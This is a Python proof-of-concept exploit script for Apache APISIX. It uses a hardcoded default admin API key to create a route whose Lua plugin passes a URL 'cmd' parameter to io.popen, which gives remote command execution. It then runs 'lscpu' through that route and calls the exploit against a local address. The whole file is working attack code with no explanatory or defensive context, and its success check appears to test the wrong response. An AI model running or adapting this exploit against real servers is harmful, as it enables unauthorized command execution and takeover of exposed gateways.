import requests
import random
import string


def poc(url):
    result = {}
    randstr = gen_random_str(10)
    try:
        url = format_url(url)

        path = """/apisix/admin/routes"""
        method = "POST"
        data = {
            "uri":"/{randstr}".format(randstr=randstr),
            "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
            "upstream":{
                "type":"roundrobin",
                "nodes":{
                "example.com:80":1
                }
            }
        }
        headers = {'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1', 'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/{randstr}?cmd=lscpu""".format(randstr=randstr)
        method = "GET"
        headers = {}
        resp1 = requests.request(method=method,url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)
        print(resp1.text)
        if ("""action":"create""" in resp1.text and """script":""" in resp1.text and """node":""" in resp1.text) and (resp1.status_code == 201):
            result["success"] = True
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


def exp(url):
    return poc(url)


def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_random_str(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))


print(exp("http://127.0.0.1:9080"))